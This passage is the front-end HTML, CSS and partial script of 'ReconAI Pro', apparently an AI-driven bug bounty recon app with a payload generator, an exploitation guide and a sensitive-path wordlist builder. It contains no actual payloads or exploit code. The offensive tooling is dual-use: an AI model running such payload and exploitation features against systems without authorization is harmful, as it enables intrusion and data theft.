+  .user-badge{display:flex;align-items:center;gap:8px;padding:6px 12px;border-radius:8px;border:1px solid var(--card-border);background:var(--card);font-size:11px;cursor:pointer;}
+  .user-avatar{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,var(--primary),var(--violet));display:flex;align-items:center;justify-content:center;font-size:11px;color:white;font-weight:700;}
+  .user-name{color:var(--text);}
+  .user-dropdown{position:absolute;top:60px;right:40px;background:var(--bg2);border:1px solid var(--card-border);border-radius:10px;padding:8px;min-width:160px;z-index:200;display:none;}
+  .user-dropdown.show{display:block;animation:fadeInDown .2s ease;}
+  .user-dropdown-item{padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;color:var(--text);}
+  .user-dropdown-item:hover{background:rgba(99,102,241,.1);color:var(--primary);}
+  .user-dropdown-item.danger{color:var(--red);}
+  .user-dropdown-item.danger:hover{background:rgba(239,68,68,.1);}
+
+  /* ── VOICE ASSISTANT ── */
+  .voice-btn{width:38px;height:38px;background:var(--bg3);border:1px solid var(--card-border);border-radius:8px;color:var(--muted);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;transition:all .2s;flex-shrink:0;}
+  .voice-btn:hover{border-color:var(--primary);color:var(--primary);}
+  .voice-btn.listening{border-color:var(--red);color:var(--red);background:rgba(239,68,68,.1);animation:voice-pulse 1s infinite;}
+  .voice-btn.speaking{border-color:var(--cyan);color:var(--cyan);background:rgba(34,211,238,.1);animation:voice-pulse 1s infinite;}
+  @keyframes voice-pulse{0%,100%{box-shadow:0 0 0 0 currentColor}50%{box-shadow:0 0 0 6px transparent}}
+  .voice-status{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--bg2);border:1px solid var(--card-border);border-radius:30px;padding:10px 20px;font-size:12px;display:none;align-items:center;gap:10px;z-index:500;box-shadow:0 8px 32px rgba(0,0,0,.4);}
+  .voice-status.show{display:flex;animation:fadeInUp .3s ease;}
+  .voice-wave{display:flex;gap:3px;align-items:center;}
+  .voice-wave span{width:3px;border-radius:2px;background:var(--primary);animation:wave 1s infinite ease-in-out;}
+  .voice-wave span:nth-child(1){height:8px;animation-delay:0s;}
+  .voice-wave span:nth-child(2){height:16px;animation-delay:.1s;}
+  .voice-wave span:nth-child(3){height:22px;animation-delay:.2s;}
+  .voice-wave span:nth-child(4){height:16px;animation-delay:.3s;}
+  .voice-wave span:nth-child(5){height:8px;animation-delay:.4s;}
+  @keyframes wave{0%,100%{transform:scaleY(.5)}50%{transform:scaleY(1)}}
+  @media(max-width:900px){
+    .recon-layout{grid-template-columns:1fr;padding:16px;}
+    .phases-progress{grid-template-columns:repeat(2,1fr);}
+    .stats-row,.dash-stats{grid-template-columns:repeat(2,1fr);padding:0 20px;}
+    .phases-grid{grid-template-columns:1fr;padding:0 20px 40px;}
+    .hero{padding:40px 20px 30px;}
+    nav{padding:14px 20px;}
+    .dashboard-layout,.settings-layout{padding:16px;}
+  }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+</head>
+<body>
+<div class="ambient ambient-1"></div>
+<div class="ambient ambient-2"></div>
+<div class="ambient-3"></div>
+
+<!-- ── AUTH OVERLAY ── -->
+<div class="auth-overlay" id="auth-overlay">
+  <div class="auth-box">
+    <div class="auth-logo">ReconAI Pro</div>
+    <div class="auth-tagline">AI-Powered Bug Bounty Recon Platform</div>
+    <div class="auth-tabs">
+      <button class="auth-tab active" id="tab-login" onclick="switchAuthTab('login')">Sign In</button>
+      <button class="auth-tab" id="tab-signup" onclick="switchAuthTab('signup')">Sign Up</button>
+    </div>
+    <div id="auth-error" class="auth-error"></div>
+    <div id="auth-success" class="auth-success"></div>
+
+    <!-- Login form -->
+    <div id="form-login">
+      <div class="auth-field">
+        <label>Username or Email</label>
+        <input class="auth-input" id="login-user" type="text" placeholder="Username or Email" onkeydown="if(event.key==='Enter')doLogin()">
+      </div>
+      <div class="auth-field">
+        <label>Password</label>
+        <input class="auth-input" id="login-pass" type="password" placeholder="Password" onkeydown="if(event.key==='Enter')doLogin()">
+      </div>
+      <button class="auth-btn" onclick="doLogin()">🔐 Sign In</button>
+      <div class="auth-divider">or</div>
+      <button class="auth-guest" onclick="guestLogin()">👤 Continue as Guest</button>
+    </div>
+
+    <!-- Signup form -->
+    <div id="form-signup" style="display:none">
+      <div class="auth-field">
+        <label>Full Name</label>
+        <input class="auth-input" id="signup-name" type="text" placeholder="Full Name">
+      </div>
+      <div class="auth-field">
+        <label>Username</label>
+        <input class="auth-input" id="signup-user" type="text" placeholder="Username">
+      </div>
+      <div class="auth-field">
+        <label>Email</label>
+        <input class="auth-input" id="signup-email" type="email" placeholder="Email">
+      </div>
+      <div class="auth-field">
+        <label>Password</label>
+        <input class="auth-input" id="signup-pass" type="password" placeholder="Min 6 characters">
+      </div>
+      <button class="auth-btn" onclick="doSignup()">🚀 Create Account</button>
+      <div class="auth-divider">or</div>
+      <button class="auth-guest" onclick="guestLogin()">👤 Continue as Guest</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── VOICE STATUS BAR ── -->
+<div class="voice-status" id="voice-status">
+  <div class="voice-wave"><span></span><span></span><span></span><span></span><span></span></div>
+  <span id="voice-status-text">Listening...</span>
+  <button onclick="stopVoice()" style="background:none;border:none;color:var(--red);cursor:pointer;font-size:14px;margin-left:8px">✕</button>
+</div>
+
+<!-- ── USER DROPDOWN ── -->
+<div class="user-dropdown" id="user-dropdown">
+  <div class="user-dropdown-item" onclick="showPage('dashboard')">📊 Dashboard</div>
+  <div class="user-dropdown-item" onclick="showPage('settings')">⚙️ Settings</div>
+  <div class="user-dropdown-item danger" onclick="doLogout()">🚪 Sign Out</div>
+</div>
+
+<div id="app">
+  <nav>
+    <span class="logo">ReconAI Pro</span>
+    <div class="api-status">
+      <div class="api-dot" id="api-dot"></div>
+      <span id="api-status-text">Checking server...</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:12px;">
+      <div class="nav-tabs">
+        <button class="nav-tab active" onclick="showPage('landing')">Home</button>
+        <button class="nav-tab" onclick="showPage('recon')">New Scan</button>
+        <button class="nav-tab" onclick="showPage('dashboard')">Dashboard</button>
+        <button class="nav-tab" onclick="showPage('toolkit')">🧰 Toolkit</button>
+        <button class="nav-tab" onclick="showPage('settings')">Settings</button>
+      </div>
+      <button class="theme-toggle" id="theme-toggle-btn" onclick="toggleTheme()" title="Toggle light/dark theme">🌙</button>
+      <div class="user-badge" id="user-badge" onclick="toggleDropdown()" style="display:none">
+        <div class="user-avatar" id="user-avatar">NR</div>
+        <span class="user-name" id="user-name-nav">Nivesh</span>
+        <span style="color:var(--muted);font-size:10px">▾</span>
+      </div>
+    </div>
+  </nav>
+
+  <!-- LANDING -->
+  <div id="page-landing" class="page active">
+    <div class="hero">
+      <div class="hero-tag">● AI-Powered Bug Bounty Recon — localhost edition</div>
+      <h1><span class="grad">Automate Your<br>Recon Workflow</span></h1>
+      <p>ReconAI Pro runs your complete Enhanced OWASP Top 10 workflow, powered by a security-specialized Claude AI model running on your local server.</p>
+      <div class="hero-cta">
+        <button class="btn-primary" onclick="showPage('recon')">🚀 Start New Scan</button>
+        <button class="btn-secondary" onclick="showPage('settings')">⚙️ Configure API Key</button>
+      </div>
+    </div>
+    <div class="model-badge-row">
+      <div class="model-badge"><span class="mb-icon">🤖</span><span class="mb-label">Model:</span><span class="mb-val" id="landing-model-name">Connecting...</span></div>
+      <div class="model-badge"><span class="mb-icon">🔒</span><span class="mb-label">Mode:</span><span class="mb-val">Local Server (localhost:3000)</span></div>
+      <div class="model-badge"><span class="mb-icon">🎯</span><span class="mb-label">Specialization:</span><span class="mb-val">OWASP Top 10 + CVE Database</span></div>
+      <div class="model-badge"><span class="mb-icon">📡</span><span class="mb-label">API:</span><span class="mb-val" id="landing-api-status">Checking...</span></div>
+    </div>
+    <div class="stats-row">
+      <div class="stat-card"><div class="stat-num">20+</div><div class="stat-label">RECON TOOLS</div></div>
+      <div class="stat-card"><div class="stat-num">5</div><div class="stat-label">TOOLKIT MODULES</div></div>
+      <div class="stat-card"><div class="stat-num">10</div><div class="stat-label">OWASP CHECKS</div></div>
+      <div class="stat-card"><div class="stat-num">AI</div><div class="stat-label">SECURITY TUNED</div></div>
+    </div>
+    <div class="phases-grid">
+      <div class="phase-card"><div class="phase-num">Phase 01</div><div class="phase-title">Asset Discovery</div><div class="phase-desc">Exhaustive subdomain enumeration, port scanning, endpoint extraction and live host filtering.</div><div class="phase-tools"><span class="tool-chip">subfinder</span><span class="tool-chip">amass</span><span class="tool-chip">masscan</span><span class="tool-chip">katana</span><span class="tool-chip">httpx</span></div></div>
+      <div class="phase-card"><div class="phase-num">Phase 02</div><div class="phase-title">Tech Fingerprinting</div><div class="phase-desc">Identify frameworks, CMS, libraries and outdated dependencies with known CVEs.</div><div class="phase-tools"><span class="tool-chip">whatweb</span><span class="tool-chip">wappalyzer</span><span class="tool-chip">nuclei</span><span class="tool-chip">retire.js</span></div></div>
+      <div class="phase-card"><div class="phase-num">Phase 03</div><div class="phase-title">OWASP Top 10 Scan</div><div class="phase-desc">Targeted recon for all 10 OWASP risks with CVE correlation and CVSS scoring.</div><div class="phase-tools"><span class="tool-chip">ffuf</span><span class="tool-chip">dalfox</span><span class="tool-chip">testssl</span><span class="tool-chip">nikto</span><span class="tool-chip">arjun</span></div></div>
+      <div class="phase-card"><div class="phase-num">Phase 04</div><div class="phase-title">Automation Pipelines</div><div class="phase-desc">High-throughput chained pipelines with nuclei templates and Discord alerting.</div><div class="phase-tools"><span class="tool-chip">reconftw</span><span class="tool-chip">bbot</span><span class="tool-chip">nuclei templates</span><span class="tool-chip">notify</span></div></div>
+    </div>
+  </div>
+
+  <!-- RECON PAGE -->
+  <div id="page-recon" class="page">
+    <div class="recon-layout">
+      <div class="chat-panel">
+        <div class="panel-header">
+          <div class="panel-header-icon">🤖</div>
+          <div><div class="panel-title">ReconAI Assistant</div><div class="panel-sub" id="chat-sub">Enter target to begin</div></div>
+        </div>
+        <div class="chat-messages" id="chat-messages">
+          <div class="msg ai">
+            <div class="msg-avatar">🤖</div>
+            <div><div class="msg-bubble">👋 Hey! I'm <strong>ReconAI Pro</strong> — running locally with a security-specialized AI model.<br><br>Enter a target domain to start your OWASP Top 10 recon. I'll ask 5 setup questions then run the full workflow. 🎯</div></div>
+          </div>
+        </div>
+        <div class="chat-input-area">
+          <button class="voice-btn" id="voice-btn" onclick="toggleVoice()" title="Voice input">🎤</button>
+          <textarea class="chat-input" id="chat-input" placeholder="Enter target domain or speak with 🎤..." rows="1" onkeydown="handleInputKey(event)"></textarea>
+          <button class="send-btn" id="send-btn" onclick="sendMessage()">➤</button>
+        </div>
+      </div>
+
+      <div class="output-panel">
+        <div class="phases-progress">
+          <div class="phase-progress-card" id="pp1"><div class="pp-label">Phase 01</div><div class="pp-name">Asset Discovery</div><div class="pp-bar-track"><div class="pp-bar-fill" id="pp1-bar"></div></div><div class="pp-status idle" id="pp1-status">Waiting...</div></div>
+          <div class="phase-progress-card" id="pp2"><div class="pp-label">Phase 02</div><div class="pp-name">Tech Fingerprint</div><div class="pp-bar-track"><div class="pp-bar-fill" id="pp2-bar"></div></div><div class="pp-status idle" id="pp2-status">Waiting...</div></div>
+          <div class="phase-progress-card" id="pp3"><div class="pp-label">Phase 03</div><div class="pp-name">OWASP Top 10</div><div class="pp-bar-track"><div class="pp-bar-fill" id="pp3-bar"></div></div><div class="pp-status idle" id="pp3-status">Waiting...</div></div>
+          <div class="phase-progress-card" id="pp4"><div class="pp-label">Phase 04</div><div class="pp-name">Automation</div><div class="pp-bar-track"><div class="pp-bar-fill" id="pp4-bar"></div></div><div class="pp-status idle" id="pp4-status">Waiting...</div></div>
+        </div>
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <div class="term-dots"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+            <span class="term-title" id="term-title">reconai-pro — terminal</span>
+            <div class="term-status-dot" id="term-status"></div>
+          </div>
+          <div class="terminal-output" id="terminal-output">
+            <div class="t-line info">ReconAI Pro v3.0.0 — Real Tools + Fine-tuned AI</div>
+            <div class="t-line info">Model: <span id="term-model-name">checking...</span></div>
+            <div class="t-line info">Server: <span id="term-server-url">http://localhost:3001</span></div>
+            <div class="t-line info">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+            <div class="t-line info">Awaiting target input...</div>
+            <div class="t-line"><span class="t-prompt">recon@pro:~$</span> <span class="t-cursor"></span></div>
+          </div>
+        </div>
+        <div class="report-section" id="report-section">
+          <div class="report-header-row">
+            <div class="report-title-label">🛡️ Recon Report</div>
+            <div class="report-actions">
+              <button class="report-btn" id="copy-btn" onclick="copyReport()">📋 Copy MD</button>
+              <button class="report-btn" onclick="downloadReport()">⬇️ Download .md</button>
+              <button class="report-btn" onclick="downloadReportPDF()">📄 Download PDF</button>
+            </div>
+          </div>
+          <div class="report-content" id="report-content"></div>
+        </div>
+        <div class="exploit-section" id="exploit-section">
+          <div class="report-header-row">
+            <div class="exploit-title-label">🔥 Exploitation Guide</div>
+            <div class="report-actions">
+              <button class="report-btn" id="copy-exploit-btn" onclick="copyExploit()">📋 Copy MD</button>
+              <button class="report-btn" onclick="downloadExploit()">⬇️ Download .md</button>
+              <button class="report-btn" onclick="downloadExploitPDF()">📄 Download PDF</button>
+            </div>
+          </div>
+          <div class="exploit-disclaimer">⚠️ <strong>Authorized Use Only</strong> — Only test programs you are explicitly authorized to test. Respect all rate limits and program rules.</div>
+          <div class="exploit-phases" id="exploit-phases">
+            <div class="exp-phase-chip" id="ep-a01"><span class="exp-phase-chip-icon">🚪</span>A01 Access</div>
+            <div class="exp-phase-chip" id="ep-a02"><span class="exp-phase-chip-icon">🔐</span>A02 Crypto</div>
+            <div class="exp-phase-chip" id="ep-a03"><span class="exp-phase-chip-icon">💉</span>A03 Inject</div>
+            <div class="exp-phase-chip" id="ep-a07"><span class="exp-phase-chip-icon">🪪</span>A07 Auth</div>
+            <div class="exp-phase-chip" id="ep-a08"><span class="exp-phase-chip-icon">🌐</span>A08 SSRF</div>
+          </div>
+          <div class="exploit-content" id="exploit-content"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div id="page-dashboard" class="page">
+    <div class="dashboard-layout">
+      <div class="dash-title">Scan Dashboard</div>
+      <div class="dash-sub">Complete recon history and findings overview</div>
+      <div class="dash-stats">
+        <div class="dash-stat"><div class="dash-stat-label">Total Scans</div><div class="dash-stat-value primary" id="ds-total">0</div><div class="dash-stat-change" id="ds-total-c">—</div></div>
+        <div class="dash-stat"><div class="dash-stat-label">Findings</div><div class="dash-stat-value amber" id="ds-findings">0</div><div class="dash-stat-change" id="ds-findings-c">—</div></div>
+        <div class="dash-stat"><div class="dash-stat-label">Critical/High</div><div class="dash-stat-value red" id="ds-critical">0</div><div class="dash-stat-change">Needs manual testing</div></div>
+        <div class="dash-stat"><div class="dash-stat-label">Domains</div><div class="dash-stat-value green" id="ds-domains">0</div><div class="dash-stat-change">Unique targets</div></div>
+      </div>
+      <div class="scans-table-wrap">
+        <div class="scans-table-header"><div class="scans-table-title">Scan History</div></div>
+        <table class="scans-table">
+          <thead><tr><th>Target</th><th>Status</th><th>Subdomains</th><th>Findings</th><th>Severity</th><th>Date</th><th>Report</th></tr></thead>
+          <tbody id="scans-tbody"><tr><td colspan="7" style="text-align:center;color:var(--muted);padding:28px;font-size:12px;">No scans yet. Start your first scan from the New Scan tab.</td></tr></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOOLKIT PAGE -->
+  <div id="page-toolkit" class="page">
+    <div class="dashboard-layout">
+      <div class="dash-title">🧰 Bug Bounty Toolkit</div>
+      <div class="dash-sub">CVE Search · Payload Generator · Report Builder · Wordlist Builder · CVSS Calculator</div>
+
+      <!-- TOOLKIT TABS -->
+      <div style="display:flex;gap:8px;margin-bottom:22px;flex-wrap:wrap;">
+        <button class="tool-nav-btn active" id="tn-cve" onclick="showTool('cve')">🔍 CVE Search</button>
+        <button class="tool-nav-btn" id="tn-payload" onclick="showTool('payload')">💉 Payload Gen</button>
+        <button class="tool-nav-btn" id="tn-report" onclick="showTool('report')">📝 Report Builder</button>
+        <button class="tool-nav-btn" id="tn-wordlist" onclick="showTool('wordlist')">📋 Wordlist Builder</button>
+        <button class="tool-nav-btn" id="tn-cvss" onclick="showTool('cvss')">⚠️ CVSS Calc</button>
+      </div>
+
+      <!-- CVE SEARCH TOOL -->
+      <div id="tool-cve" class="toolkit-panel">
+        <div class="tk-card">
+          <div class="tk-card-title">🔍 CVE / Vulnerability Search</div>
+          <div class="tk-row">
+            <input class="settings-input" id="cve-query" placeholder="e.g. JWT bypass, Apache 2.4.50, Spring4Shell..." style="flex:1" onkeydown="if(event.key==='Enter')searchCVE()">
+            <select class="settings-input" id="cve-severity" style="width:140px">
+              <option value="">All Severities</option>
+              <option value="CRITICAL">Critical</option>
+              <option value="HIGH">High</option>
+              <option value="MEDIUM">Medium</option>
+              <option value="LOW">Low</option>
+            </select>
+            <button class="settings-save-btn" style="margin-top:0" onclick="searchCVE()">Search</button>
+          </div>
+          <div id="cve-loading" style="display:none;color:var(--muted);font-size:12px;padding:12px 0">
+            <span class="thinking-dots"><span></span><span></span><span></span></span> Searching CVE database...
+          </div>
+          <div id="cve-results" style="margin-top:14px"></div>
+        </div>
+      </div>
+
+      <!-- PAYLOAD GENERATOR TOOL -->
+      <div id="tool-payload" class="toolkit-panel" style="display:none">
+        <div class="tk-card">
+          <div class="tk-card-title">💉 Payload Generator</div>
+          <div class="tk-row">
+            <select class="settings-input" id="payload-type" style="flex:1">
+              <option value="xss">XSS — Cross-Site Scripting</option>
+              <option value="sqli">SQL Injection</option>
+              <option value="ssrf">SSRF — Server-Side Request Forgery</option>
+              <option value="lfi">LFI — Local File Inclusion</option>
+              <option value="xxe">XXE — XML External Entity</option>
+              <option value="ssti">SSTI — Server-Side Template Injection</option>
+              <option value="open-redirect">Open Redirect</option>
+              <option value="cors">CORS Misconfiguration</option>
+              <option value="jwt">JWT Bypass</option>
+              <option value="cmd">Command Injection</option>
+            </select>
+            <select class="settings-input" id="payload-context" style="width:160px">
+              <option value="html">HTML context</option>
+              <option value="attr">HTML attribute</option>
+              <option value="js">JavaScript context</option>
+              <option value="url">URL parameter</option>
+              <option value="json">JSON body</option>
+              <option value="xml">XML body</option>
+            </select>
+            <input class="settings-input" id="payload-target-hint" placeholder="Target domain (optional)" style="width:200px">
+            <button class="settings-save-btn" style="margin-top:0" onclick="generatePayloads()">Generate</button>
+          </div>
+          <div id="payload-loading" style="display:none;color:var(--muted);font-size:12px;padding:12px 0">
+            <span class="thinking-dots"><span></span><span></span><span></span></span> Generating payloads...
+          </div>
+          <div id="payload-results" style="margin-top:14px"></div>
+        </div>
+      </div>
+
+      <!-- REPORT BUILDER TOOL -->
+      <div id="tool-report" class="toolkit-panel" style="display:none">
+        <div class="tk-card">
+          <div class="tk-card-title">📝 Bug Report Builder</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Platform</label>
+              <select class="settings-input" id="rpt-platform">
+                <option>HackerOne</option>
+                <option>Bugcrowd</option>
+                <option>Intigriti</option>
+                <option>YesWeHack</option>
+                <option>Custom</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Severity</label>
+              <select class="settings-input" id="rpt-severity">
+                <option>Critical</option>
+                <option>High</option>
+                <option>Medium</option>
+                <option>Low</option>
+                <option>Informational</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Vulnerability Type</label>
+              <input class="settings-input" id="rpt-vuln-type" placeholder="e.g. JWT Authentication Bypass">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Affected URL</label>
+              <input class="settings-input" id="rpt-url" placeholder="https://api.target.com/auth/login">
+            </div>
+            <div style="grid-column:1/-1">
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Brief Description of the Bug</label>
+              <textarea class="settings-input" id="rpt-desc" rows="3" placeholder="The /api/auth endpoint accepts JWT tokens with alg:none, allowing an attacker to forge tokens without a valid signature..."></textarea>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Impact</label>
+              <input class="settings-input" id="rpt-impact" placeholder="Authentication bypass, account takeover">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">CVSS Score (optional)</label>
+              <input class="settings-input" id="rpt-cvss" placeholder="9.1">
+            </div>
+          </div>
+          <button class="settings-save-btn" onclick="generateReport_builder()">🤖 Generate Report with AI</button>
+          <div id="report-loading" style="display:none;color:var(--muted);font-size:12px;padding:12px 0">
+            <span class="thinking-dots"><span></span><span></span><span></span></span> AI building your report...
+          </div>
+          <div id="report-builder-output" style="margin-top:14px"></div>
+        </div>
+      </div>
+
+      <!-- WORDLIST BUILDER TOOL -->
+      <div id="tool-wordlist" class="toolkit-panel" style="display:none">
+        <div class="tk-card">
+          <div class="tk-card-title">📋 Custom Wordlist Builder</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Target Domain</label>
+              <input class="settings-input" id="wl-domain" placeholder="example.com">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Wordlist Type</label>
+              <select class="settings-input" id="wl-type">
+                <option value="subdomains">Subdomain Enumeration</option>
+                <option value="directories">Directory / Path Fuzzing</option>
+                <option value="params">Parameter Names</option>
+                <option value="api">API Endpoints</option>
+                <option value="secrets">Sensitive File Paths</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Industry / Tech Stack</label>
+              <input class="settings-input" id="wl-tech" placeholder="e.g. SaaS, fintech, Node.js, WordPress">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Size</label>
+              <select class="settings-input" id="wl-size">
+                <option value="small">Small (~50 entries)</option>
+                <option value="medium">Medium (~150 entries)</option>
+                <option value="large">Large (~400 entries)</option>
+              </select>
+            </div>
+          </div>
+          <button class="settings-save-btn" onclick="generateWordlist()">🤖 Generate Wordlist</button>
+          <div id="wordlist-loading" style="display:none;color:var(--muted);font-size:12px;padding:12px 0">
+            <span class="thinking-dots"><span></span><span></span><span></span></span> AI generating wordlist...
+          </div>
+          <div id="wordlist-output" style="margin-top:14px"></div>
+        </div>
+      </div>
+
+      <!-- CVSS CALCULATOR -->
+      <div id="tool-cvss" class="toolkit-panel" style="display:none">
+        <div class="tk-card">
+          <div class="tk-card-title">⚠️ CVSS 3.1 Calculator</div>
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px">
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Attack Vector (AV)</label>
+              <select class="settings-input" id="cvss-av" onchange="calcCVSS()">
+                <option value="N">Network (0.85)</option>
+                <option value="A">Adjacent (0.62)</option>
+                <option value="L">Local (0.55)</option>
+                <option value="P">Physical (0.20)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Attack Complexity (AC)</label>
+              <select class="settings-input" id="cvss-ac" onchange="calcCVSS()">
+                <option value="L">Low (0.77)</option>
+                <option value="H">High (0.44)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Privileges Required (PR)</label>
+              <select class="settings-input" id="cvss-pr" onchange="calcCVSS()">
+                <option value="N">None (0.85)</option>
+                <option value="L">Low (0.62)</option>
+                <option value="H">High (0.27)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">User Interaction (UI)</label>
+              <select class="settings-input" id="cvss-ui" onchange="calcCVSS()">
+                <option value="N">None (0.85)</option>
+                <option value="R">Required (0.62)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Scope (S)</label>
+              <select class="settings-input" id="cvss-s" onchange="calcCVSS()">
+                <option value="U">Unchanged</option>
+                <option value="C">Changed</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Confidentiality (C)</label>
+              <select class="settings-input" id="cvss-c" onchange="calcCVSS()">
+                <option value="H">High (0.56)</option>
+                <option value="L">Low (0.22)</option>
+                <option value="N">None (0.00)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Integrity (I)</label>
+              <select class="settings-input" id="cvss-i" onchange="calcCVSS()">
+                <option value="H">High (0.56)</option>
+                <option value="L">Low (0.22)</option>
+                <option value="N">None (0.00)</option>
+              </select>
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:5px">Availability (A)</label>
+              <select class="settings-input" id="cvss-a" onchange="calcCVSS()">
+                <option value="H">High (0.56)</option>
+                <option value="L">Low (0.22)</option>
+                <option value="N">None (0.00)</option>
+              </select>
+            </div>
+          </div>
+          <div id="cvss-result" style="background:var(--bg2);border:1px solid var(--card-border);border-radius:12px;padding:20px;text-align:center">
+            <div style="font-family:var(--display);font-size:48px;font-weight:800;color:var(--red)" id="cvss-score">9.8</div>
+            <div style="font-size:13px;font-weight:700;color:var(--red);margin:4px 0" id="cvss-rating">CRITICAL</div>
+            <div style="font-size:11px;color:var(--muted)" id="cvss-vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+            <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap" id="cvss-badges"></div>
+          </div>
+          <div style="margin-top:12px;font-size:11px;color:var(--muted);background:var(--bg3);border-radius:8px;padding:12px" id="cvss-explanation"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div id="page-settings" class="page">
+    <div class="settings-layout">
+      <div class="settings-title">⚙️ Settings</div>
+      <div class="settings-sub">Configure your local ReconAI Pro instance</div>
+      <div class="settings-card">
+        <div class="settings-card-title">🔑 Anthropic API Key</div>
+        <div class="settings-field">
+          <label>Your API key is stored in <code style="color:var(--cyan)">.env</code> on the server. Enter it here to update without restarting.</label>
+          <input class="settings-input" type="password" id="apikey-input" placeholder="sk-ant-api03-...">
+        </div>
+        <button class="settings-save-btn" onclick="saveApiKey()">Save & Test Connection</button>
+        <div id="api-test-result" style="display:none" class="api-test-result"></div>
+        <div class="model-info">
+          <div class="model-info-title" id="settings-model-name">🤖 AI Model: Connecting...</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>Security-specialized system prompt with OWASP Top 10 deep knowledge</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>CVE database cross-referencing and CVSS 3.1 scoring built-in</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>Real tool syntax validation (sqlmap, dalfox, nuclei, ffuf flags)</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>False-positive reduction via multi-tool confidence scoring</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>HackerOne payout estimation based on historical bug bounty data</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>Attack chain identification (SSRF → cloud metadata → account takeover)</div>
+          <div class="model-feat"><span class="model-feat-icon">✓</span>P1/P2/P3/P4 severity classification per bug bounty platform standards</div>
+        </div>
+      </div>
+      <div class="settings-card">
+        <div class="settings-card-title">🖥️ Server Status</div>
+        <div style="font-size:12px;color:var(--muted);line-height:2.2;">
+          API URL: <code style="color:var(--cyan)" id="server-url-display">checking...</code><br>
+          Port: <code style="color:var(--cyan)">3001</code><br>
+          Status: <span id="server-status-text" style="color:var(--muted)">Checking...</span>
+        </div>
+        <button class="settings-save-btn" onclick="testConnection()" style="margin-top:12px">🔌 Test Connection Now</button>
+        <div id="connection-test-result" style="font-size:11px;margin-top:10px;display:none"></div>
+      </div>
+      <div class="settings-card">
+        <div class="settings-card-title">📋 Quick Start</div>
+        <div style="font-size:11px;color:var(--muted);line-height:2.2;">
+          1. Copy <code style="color:var(--cyan)">.env.example</code> → <code style="color:var(--cyan)">.env</code><br>
+          2. Add your Anthropic API key to <code style="color:var(--cyan)">.env</code><br>
+          3. Run <code style="color:var(--cyan)">npm install</code> in the project folder<br>
+          4. Run <code style="color:var(--cyan)">node server.js</code> (or <code style="color:var(--cyan)">npm start</code>)<br>
+          5. Open <code style="color:var(--cyan)">http://localhost:3001</code> in your browser<br>
+          6. Enter a bug bounty target domain and start scanning!
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─── State ─────────────────────────────────────────────────────────────────
+const S = {
+  page:'landing', target:null, scanConfig:{}, questionStep:0,
+  scanning:false, reportMd:'', exploitMd:'', scans:[],
+  awaitingExploitChoice:false, awaitingExploitDepth:false, exploitConfig:{},
+  serverOk:false, apiKeyOverride:null
+};
+
+// Auto-detect server URL — works whether opened via file:// or http://
+const API = (window.location.protocol === 'file:')
+  ? 'http://localhost:3001/api'   // opened as file — use explicit URL
+  : '/api';                        // served by Express — use relative URL
+
+// ─── Server health check ───────────────────────────────────────────────────
+async function checkServer() {
+  // Update terminal API URL display
+  const termUrl = document.getElementById('term-server-url');
+  if (termUrl) termUrl.textContent = API.replace('/api','') + ' (API: ' + API + ')';
+
